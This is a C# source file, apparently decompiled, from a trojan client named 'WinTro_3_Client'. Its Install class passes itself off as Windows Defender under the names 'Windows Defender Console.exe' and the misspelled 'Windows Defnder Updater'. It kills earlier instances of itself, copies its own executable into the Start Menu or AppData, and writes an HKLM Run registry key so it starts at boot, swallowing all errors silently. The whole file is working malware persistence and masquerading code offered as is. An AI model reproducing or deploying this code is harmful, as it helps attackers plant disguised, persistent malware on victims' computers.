using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WinTro_3_Client;

internal class Install
{
	public enum InstallMethod
	{
		StartMenu,
		AppDataWithRegistryKey
	}

	public const string Name = "Windows Defnder Updater";

	public const string SaveFileName = "\\Windows Defender Console.exe";

	private static string registryKey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	public static bool isRunning()
	{
		Process[] processesByName = Process.GetProcessesByName("Windows Defender Console");
		if (0 >= processesByName.Length)
		{
			return false;
		}
		return true;
	}

	public static void KillProcess()
	{
		Process[] processesByName = Process.GetProcessesByName("Windows Defender Console");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
	}

	public static void InstallWTc(InstallMethod metodo)
	{
		if (isRunning())
		{
			KillProcess();
		}
		try
		{
			switch (metodo)
			{
			case InstallMethod.StartMenu:
				File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\Windows Defender Console.exe");
				break;
			case InstallMethod.AppDataWithRegistryKey:
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows Defender Console.exe";
				File.Copy(Application.get_ExecutablePath(), text);
				Registry.SetValue(registryKey, "Windows Defnder Updater", text);
				break;
			}
			}
		}
		catch (Exception)
		{
		}
	}
}
